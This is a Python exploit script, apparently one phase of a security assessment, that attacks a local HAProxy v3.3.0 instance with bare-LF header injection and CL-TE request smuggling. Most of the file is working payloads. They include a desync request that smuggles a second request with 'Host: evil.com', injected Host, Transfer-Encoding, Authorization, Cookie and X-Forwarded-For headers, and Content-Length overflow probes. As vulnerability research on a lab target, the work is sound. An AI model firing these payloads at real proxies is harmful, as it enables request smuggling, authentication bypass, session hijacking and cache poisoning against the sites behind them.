#!/usr/bin/env python3
"""
Phase 8: Bare LF Request Smuggling Exploitation
Target: HAProxy v3.3.0 on 127.0.0.1:8180

Validates whether bare LF + Transfer-Encoding injection creates
an actual CL-TE request smuggling vulnerability.
"""

import socket
import time
import json
import os

EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/HAProxy/evidence"
EVIDENCE_FILE = os.path.join(EVIDENCE_DIR, "phase8_bare_lf_smuggling.json")

HOST = "127.0.0.1"
HTTP_PORT = 8180


class EvidenceCollector:
    def __init__(self):
        self.findings = []
        self.tests = []
        self.test_count = 0
        self.anomaly_count = 0
        self.finding_count = 0

    def add_test(self, category, name, result, details="", severity=None, raw_data=None):
        self.test_count += 1
        entry = {"id": self.test_count, "category": category, "name": name,
                 "result": result, "details": details, "timestamp": time.time()}
        if severity: entry["severity"] = severity
        if raw_data: entry["raw_data"] = raw_data
        self.tests.append(entry)
        if result == "ANOMALY": self.anomaly_count += 1
        elif result in ("VULNERABLE", "FINDING"):
            self.finding_count += 1
            self.findings.append(entry)
        status = f"[{result}]"
        sev = f" ({severity})" if severity else ""
        print(f"  {status:14s} {category}/{name}{sev}")
        if details and result in ("VULNERABLE", "FINDING", "ANOMALY"):
            for line in str(details).split("\n")[:8]:
                print(f"               {line}")

    def save(self):
        data = {"phase": "Phase 8: Bare LF Request Smuggling Exploitation",
                "target": "HAProxy v3.3.0", "timestamp": time.time(),
                "summary": {"total_tests": self.test_count,
                           "anomalies": self.anomaly_count,
                           "findings": self.finding_count},
                "findings": self.findings, "tests": self.tests}
        with open(EVIDENCE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"\n[*] Evidence saved: {EVIDENCE_FILE}")
        print(f"    Tests: {self.test_count} | Anomalies: {self.anomaly_count} | Findings: {self.finding_count}")


evidence = EvidenceCollector()


def http_raw_keepalive(host, port, payloads, timeout=5):
    """Send multiple payloads on a single persistent connection."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        responses = []
        for payload in payloads:
            sock.sendall(payload)
            time.sleep(0.3)
            resp = b""
            sock.settimeout(1)
            try:
                while True:
                    chunk = sock.recv(65536)
                    if not chunk: break
                    resp += chunk
            except socket.timeout:
                pass
            responses.append(resp)
        sock.close()
        return responses
    except Exception as e:
        return [str(e).encode()]


def http_raw(host, port, payload, timeout=5):
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.sendall(payload)
        resp = b""
        sock.settimeout(timeout)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk: break
                resp += chunk
        except socket.timeout:
            pass
        sock.close()
        return resp
    except Exception as e:
        return str(e).encode()


def http_status(resp):
    parts = resp.split(b" ", 2)
    return int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0


print("=" * 70)
print("Phase 8: Bare LF Request Smuggling Exploitation")
print(f"Target: HAProxy v3.3.0 @ {HOST}:{HTTP_PORT}")
print("=" * 70)

# ============================================================
# Test 1: Confirm bare LF + TE injection reach the backend
# ============================================================
print("\n[*] Test 1: Bare LF + TE Injection Confirmation")

payload = (
    b"POST / HTTP/1.1\r\n"
    b"Host: 127.0.0.1:8180\r\n"
    b"Content-Length: 5\r\n"
    b"X-Test: before\nTransfer-Encoding: chunked\r\n"
    b"\r\n"
    b"hello"
)
resp = http_raw(HOST, HTTP_PORT, payload)
body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""

try:
    backend_data = json.loads(body.decode('utf-8', errors='replace'))
    headers = backend_data.get("headers", {})
    has_te = "transfer-encoding" in [k.lower() for k in headers.keys()]
    has_cl = "content-length" in [k.lower() for k in headers.keys()]

    evidence.add_test("Smuggle-Confirm", "post_te_inject",
                     "FINDING" if has_te else "SAFE",
                     f"POST with bare LF TE injection:\n"
                     f"Backend headers: {json.dumps(headers, indent=2)[:500]}\n"
                     f"Has TE: {has_te}, Has CL: {has_cl}\n"
                     f"Body received by backend: {backend_data.get('body', 'N/A')[:200]}",
                     "HIGH" if has_te else None,
                     {"backend_headers": headers, "has_te": has_te, "has_cl": has_cl,
                      "backend_body": backend_data.get("body", "")[:500]})
except Exception as e:
    evidence.add_test("Smuggle-Confirm", "post_te_inject", "ERROR",
                     f"HTTP {http_status(resp)}: {str(e)}")

# ============================================================
# Test 2: CL-TE Desync — Frontend uses CL, backend uses TE
# HAProxy sees CL:X (no TE header), backend sees TE:chunked
# ============================================================
print("\n[*] Test 2: CL-TE Desync Attempt")

# Classic CL-TE smuggling:
# Frontend (HAProxy) reads body by Content-Length
# Backend reads body by Transfer-Encoding: chunked
# If desync occurs, the "smuggled" request appears as the start of the next request

# The bare LF trick: HAProxy sees "X-Foo: val\nTransfer-Encoding: chunked"
# as a single header (X-Foo: val\nTransfer-Encoding: chunked)
# It processes CL normally. But backend sees TE: chunked and uses chunked decoding.

smuggle_payload = (
    b"POST / HTTP/1.1\r\n"
    b"Host: 127.0.0.1:8180\r\n"
    b"Content-Length: 35\r\n"                         # HAProxy reads 35 bytes
    b"X-Foo: bar\nTransfer-Encoding: chunked\r\n"     # Bare LF injects TE
    b"\r\n"
    b"0\r\n"                                           # Chunked: end of body (3 bytes)
    b"\r\n"                                            # Chunked: final CRLF (2 bytes) = 5 total for chunked
    b"GET /smuggled HTTP/1.1\r\n"                      # Smuggled request start
    b"Host: evil.com\r\n"                              # 30 bytes more = 35 total for CL
    b"\r\n"
)

try:
    sock = socket.create_connection((HOST, HTTP_PORT), timeout=5)
    sock.sendall(smuggle_payload)
    time.sleep(1)
    # Read first response
    resp1 = b""
    sock.settimeout(2)
    try:
        while True:
            chunk = sock.recv(65536)
            if not chunk: break
            resp1 += chunk
    except socket.timeout:
        pass

    # Check if we got two responses (smuggled request was processed)
    # Count HTTP/1.1 response lines
    response_count = resp1.count(b"HTTP/1.")

    # Check for evidence of smuggled request
    has_smuggled = b"/smuggled" in resp1 or b"evil.com" in resp1

    evidence.add_test("CL-TE-Desync", "basic_smuggle",
                     "FINDING" if response_count > 1 or has_smuggled else "SAFE",
                     f"Responses: {response_count}, Smuggled path visible: {has_smuggled}\n"
                     f"Response data ({len(resp1)} bytes): {resp1[:500].decode('utf-8', errors='replace')}",
                     "CRITICAL" if response_count > 1 or has_smuggled else None,
                     {"response_count": response_count,
                      "has_smuggled": has_smuggled,
                      "raw_response": resp1[:1000].decode('utf-8', errors='replace')})
    sock.close()
except Exception as e:
    evidence.add_test("CL-TE-Desync", "basic_smuggle", "ERROR", str(e))


# ============================================================
# Test 3: Verify what HAProxy actually does with the bare LF header
# Does it see X-Test as one header or split it?
# ============================================================
print("\n[*] Test 3: HAProxy's own header parsing of bare LF")

# Send to backend that echoes request — check what arrives
payload = (
    b"GET /haproxy-parse-test HTTP/1.1\r\n"
    b"Host: 127.0.0.1:8180\r\n"
    b"X-Before: yes\r\n"
    b"X-Split: value1\nX-After-LF: value2\r\n"
    b"X-End: done\r\n"
    b"\r\n"
)
resp = http_raw(HOST, HTTP_PORT, payload)
body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""

try:
    backend_data = json.loads(body.decode('utf-8', errors='replace'))
    headers = backend_data.get("headers", {})
    header_keys = list(headers.keys())

    has_split = "x-split" in [k.lower() for k in header_keys]
    has_after_lf = "x-after-lf" in [k.lower() for k in header_keys]
    has_end = "x-end" in [k.lower() for k in header_keys]

    evidence.add_test("BareLF-Parse", "header_splitting",
                     "FINDING" if has_after_lf else "SAFE",
                     f"HAProxy splits bare LF into separate headers: {has_after_lf}\n"
                     f"X-Split present: {has_split}\n"
                     f"X-After-LF present: {has_after_lf}\n"
                     f"X-End present: {has_end}\n"
                     f"Backend headers: {json.dumps(headers, indent=2)[:500]}",
                     "HIGH" if has_after_lf else None,
                     {"header_keys": header_keys,
                      "backend_headers": headers,
                      "splits_on_bare_lf": has_after_lf})
except Exception as e:
    evidence.add_test("BareLF-Parse", "header_splitting", "ERROR",
                     f"HTTP {http_status(resp)}: {str(e)}")


# ============================================================
# Test 4: Impact variants — what critical headers can be injected?
# ============================================================
print("\n[*] Test 4: Critical Header Injection via Bare LF")

critical_headers = [
    ("inject_host", "X-Foo: bar\nHost: evil.com", "Host spoofing"),
    ("inject_te", "X-Foo: bar\nTransfer-Encoding: chunked", "TE injection"),
    ("inject_cl", "X-Foo: bar\nContent-Length: 9999", "CL injection"),
    ("inject_auth", "X-Foo: bar\nAuthorization: Basic YWRtaW46YWRtaW4=", "Auth injection"),
    ("inject_cookie", "X-Foo: bar\nCookie: session=stolen", "Cookie injection"),
    ("inject_x_forwarded", "X-Foo: bar\nX-Forwarded-For: [REDACTED-IP]", "XFF spoofing"),
    ("inject_x_real_ip", "X-Foo: bar\nX-Real-IP: [REDACTED-INTERNAL-IP]", "X-Real-IP spoofing"),
    ("inject_up[REDACTED]", "X-Foo: bar\nUp[REDACTED]: websocket", "Up[REDACTED] injection"),
]

for label, header_value, desc in critical_headers:
    payload = (
        f"GET /{label} HTTP/1.1\r\n"
        f"Host: 127.0.0.1:8180\r\n"
        f"X-Attack: {header_value}\r\n"
        f"\r\n"
    ).encode()
    resp = http_raw(HOST, HTTP_PORT, payload)
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""

    try:
        backend_data = json.loads(body.decode('utf-8', errors='replace'))
        headers = backend_data.get("headers", {})
        header_keys_lower = [k.lower() for k in headers.keys()]

        # Check if the injected header appears as a separate key
        injected_key = header_value.split("\n")[1].split(":")[0].strip().lower()
        has_injected = injected_key in header_keys_lower

        evidence.add_test("Critical-Inject", label,
                         "FINDING" if has_injected else "SAFE",
                         f"{desc}: {'INJECTED!' if has_injected else 'blocked'}\n"
                         f"Backend headers: {json.dumps(headers, indent=2)[:400]}",
                         "HIGH" if has_injected else None,
                         {"injected_key": injected_key,
                          "injected_present": has_injected,
                          "backend_headers": headers})
    except:
        evidence.add_test("Critical-Inject", label, "ANOMALY",
                         f"HTTP {http_status(resp)}")


# ============================================================
# Test 5: INT64_MAX Content-Length deep-dive
# ============================================================
print("\n[*] Test 5: INT64_MAX Content-Length Deep-Dive")

# Phase 7 showed HTTP 502 with max int64 CL — HAProxy forwarded it
payload = b"POST / HTTP/1.1\r\nHost: 127.0.0.1:8180\r\nContent-Length: 9223372036854775807\r\n\r\nhello"
resp = http_raw(HOST, HTTP_PORT, payload, timeout=3)
status = http_status(resp)
evidence.add_test("CL-Overflow", "int64_max_post",
                 "ANOMALY" if status not in (400,) else "SAFE",
                 f"POST with CL=INT64_MAX: HTTP {status}\n"
                 f"HAProxy {'forwarded (502 from backend)' if status == 502 else f'returned {status}'}",
                 "LOW" if status == 502 else None)

# Test with CL just past max safe value
payload = b"GET / HTTP/1.1\r\nHost: 127.0.0.1:8180\r\nContent-Length: 9223372036854775808\r\n\r\n"
resp = http_raw(HOST, HTTP_PORT, payload, timeout=3)
status = http_status(resp)
evidence.add_test("CL-Overflow", "int64_overflow",
                 "SAFE" if status in (400, 0) else "ANOMALY",
                 f"CL=INT64_MAX+1: HTTP {status}")


evidence.save()
